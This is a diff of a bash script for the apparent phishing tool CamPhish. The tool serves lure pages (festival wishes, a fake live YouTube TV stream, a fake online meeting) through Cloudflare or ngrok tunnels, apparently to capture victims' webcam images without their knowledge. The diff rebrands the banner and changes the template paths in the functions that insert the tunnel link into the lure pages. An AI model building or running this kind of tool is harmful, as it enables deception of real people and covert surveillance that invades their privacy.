@@ -1,4 +1,6 @@
 #!/bin/bash
+# CamPhish v2.0
+# Powered by TechChip
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -26,23 +28,19 @@ fi
 
 trap 'printf "\n";stop' 2
 
-## ANSI Colors
-BLACK="$(printf '\033[30m')"   RED="$(printf '\033[31m')"     GREEN="$(printf '\033[32m')"  
-YELLOW="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"    MAGENTA="$(printf '\033[35m')"  
-CYAN="$(printf '\033[36m')"    WHITE="$(printf '\033[37m')"   ORANGE="$(printf '\033[38;5;208m')"
-
-# Banner
 banner() {
-    cat << EOF
-${CYAN}                     _                              
-${CYAN}                    | |                             
-${CYAN}  _ __ ___ _ __   __| | ___ _ __   ___ __ _ _ __ ___  
-${CYAN} | '__/ _ \ '_ \ / _` |/ _ \ '__| / __/ _` | '_ ` _ \ 
-${CYAN} | | |  __/ | | | (_| |  __/ |   | (_| (_| | | | | | |
-${CYAN} |_|  \___|_| |_|\__,_|\___|_|    \___\__,_|_| |_| |_|
-${CYAN}                                             ${RED}Version: 1.1.5
-        
-EOF
+clear
+printf "\e[1;92m                     _           \e[0m\e[1;77m                     \e[0m\n"
+printf "\e[1;92m                    | |          \e[0m\e[1;77m                     \e[0m\n"
+printf "\e[1;92m  _ __ ___ _ __   __| | ___ _ __ \e[0m\e[1;77m  ___ __ _ _ __ ___  \e[0m\n"
+printf "\e[1;92m | '__/ _ \ '_ \ / _` |/ _ \ '__|\e[0m\e[1;77m / __/ _` | '_ ` _ \ \e[0m\n"
+printf "\e[1;92m | | |  __/ | | | (_| |  __/ |   \e[0m\e[1;77m| (_| (_| | | | | | |\e[0m\n"
+printf "\e[1;92m |_|  \___|_| |_|\__,_|\___|_|   \e[0m\e[1;77m \___\__,_|_| |_| |_|\e[0m\n"
+printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
+printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+
+printf "\n"
+
 }
 
 dependencies() {
@@ -290,15 +288,15 @@ checkfound
 
 payload_cloudflare() {
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' camera/template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'$link'+g' camera/festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+'$link'+g' camera/LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'$link'+g' camera/OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 }
@@ -446,15 +444,15 @@ checkfound
 
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' camera/template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'$link'+g' camera/festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+'$link'+g' camera/LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'$link'+g' camera/OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 }
